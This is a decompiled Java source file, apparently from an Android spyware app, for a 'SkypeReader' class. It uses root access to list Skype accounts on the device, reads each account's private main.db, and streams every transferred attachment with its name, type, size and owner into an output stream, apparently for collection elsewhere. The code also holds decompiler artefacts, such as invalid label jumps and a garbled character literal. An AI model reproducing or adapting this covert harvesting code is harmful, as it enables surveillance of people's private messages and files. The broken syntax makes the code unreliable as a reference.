package ru.dtlbox.databasereader;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.webkit.MimeTypeMap;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class SkypeReader
  extends AppDatabaseAttachementReader
{
  private static final String PATH_SKYPE_FILES = "/data/data/com.skype.raider/files/";
  final byte ATTACH_SKYPE = 98;
  private final String[] CURRENT_COLUMNS = { "id", "filepath" };
  private final String FIELD_ID = "id";
  private final String dbName = "skype.db";
  private String dbSourcePath;
  private int iPrevent = 0;
  private String uName = "";
  
  public SkypeReader(Config paramConfig, String paramString)
  {
    this.uName = paramString;
    this.dbSourcePath = ("/data/data/com.skype.raider/files/" + paramString + "/main.db");
    init(paramConfig, this.dbSourcePath, "skype.db");
  }
  
  private void debugCursor(Cursor paramCursor)
  {
    Log.d("skipe reading", "id: " + paramCursor.getString(0) + ", filepath: " + paramCursor.getString(1));
  }
  
  private static String getMimeType(String paramString)
  {
    int i = paramString.lastIndexOf(".");
    if ((i != -1) && (i != paramString.length() - 1))
    {
      paramString = new String(paramString.substring(i + 1));
      return MimeTypeMap.getSingleton().getMimeTypeFromExtension(paramString);
    }
    return "";
  }
  
  public static List<String> getUsers()
  {
    ArrayList localArrayList = new ArrayList();
    String[] arrayOfString = RootCommand.twoCommandSUforResult("cd /data/data/com.skype.raider/files/\n", "ls\n").split("\n");
    int i = 0;
    for (;;)
    {
      if (i >= arrayOfString.length) {
        return localArrayList;
      }
      if (arrayOfString[i].endsWith(".ecs"))
      {
        int j = arrayOfString[i].lastIndexOf(".ecs");
        localArrayList.add(new String(arrayOfString[i].substring(0, j)));
      }
      i += 1;
    }
  }
  
  public void beginPrevent(int paramInt)
  {
    this.iPrevent = paramInt;
  }
  
  public String getName()
  {
    return this.uName;
  }
  
  public boolean isPrevent()
  {
    if (this.iPrevent == 1) {
      update();
    }
    this.iPrevent -= 1;
    return this.iPrevent > 0;
  }
  
  public int readAttach(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    this.mDataBaseHelper.opendatabase();
    Object localObject3 = this.mDataBaseHelper.getDataBase().query("Transfers", this.CURRENT_COLUMNS, "id > " + String.valueOf(paramInt), null, null, null, "id");
    if (((Cursor)localObject3).getCount() == 0)
    {
      this.mDataBaseHelper.close();
      return 0;
    }
    Object localObject1 = null;
    int j = 0;
    int k = 0;
    Object localObject2 = localObject1;
    paramInt = j;
    int i = k;
    if (0 == 0)
    {
      if (((Cursor)localObject3).moveToNext()) {
        break label129;
      }
      i = k;
      paramInt = j;
      localObject2 = localObject1;
    }
    for (;;)
    {
      if ((i != 0) && (localObject2 != null)) {
        break label193;
      }
      this.mDataBaseHelper.close();
      return 0;
      label129:
      if (DEBUG_MODE) {
        debugCursor((Cursor)localObject3);
      }
      localObject2 = ((Cursor)localObject3).getString(1);
      if (localObject2 == null) {
        break;
      }
      localObject2 = new File((String)localObject2);
      localObject1 = localObject2;
      if (!((File)localObject2).exists()) {
        break;
      }
      paramInt = ((Cursor)localObject3).getInt(0);
      i = 1;
    }
    label193:
    paramOutputStream.write(98);
    localObject1 = ((File)localObject2).getName();
    localObject3 = getMimeType(((File)localObject2).getName());
    if (DEBUG_MODE) {
      Log.d("Mime-Type", "mime " + (String)localObject3);
    }
    addData(paramOutputStream, String.valueOf(paramInt));
    addData(paramOutputStream, "5");
    addData(paramOutputStream, (String)localObject3);
    addData(paramOutputStream, (String)localObject1);
    addData(paramOutputStream, this.uName);
    addData(paramOutputStream, String.valueOf(((File)localObject2).length()));
    localObject1 = new FileInputStream((File)localObject2);
    localObject2 = new byte['á€€'];
    for (;;)
    {
      i = ((FileInputStream)localObject1).read((byte[])localObject2);
      if (i <= 0)
      {
        paramOutputStream.write(1);
        paramOutputStream.write(3);
        paramOutputStream.write(2);
        this.mDataBaseHelper.close();
        return paramInt;
      }
      paramOutputStream.write((byte[])localObject2, 0, i);
    }
  }
}
